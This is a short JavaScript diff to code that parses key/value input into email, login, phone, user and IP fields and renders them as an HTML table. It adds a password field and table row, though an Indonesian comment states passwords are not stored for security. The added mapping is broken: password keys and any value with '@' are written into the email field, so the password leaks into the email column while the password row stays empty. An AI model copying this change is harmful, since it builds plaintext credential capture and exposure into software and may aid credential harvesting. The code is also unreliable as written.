@@ -42,6 +42,7 @@ function extractVars(input = "") {
     email: "-",
     login: "-",
     phone: "-",
+     password: "-",
     user: "-",
     ip: "-"
     // password tidak disimpan demi keamanan
@@ -94,6 +95,10 @@ function map(vars, key, value) {
     vars.email = v;
     return;
   }
+   if (k.includes("password") || v.includes("@")) {
+    vars.email = v;
+    return;
+   }
 
   if (k.includes("login") || k.includes("via") || k.includes("method")) {
     vars.login = v;
@@ -138,6 +143,7 @@ function buildHtml(vars) {
 <tr><td>Email</td><td>${vars.email}</td></tr>
 <tr><td>User</td><td>${vars.user}</td></tr>
 <tr><td>Login</td><td>${vars.login}</td></tr>
+<tr><td>password</td><td>${vars.password}</td></tr>
 <tr><td>Phone</td><td>${vars.phone}</td></tr>
 <tr><td>IP</td><td>${vars.ip}</td></tr>
 </table>
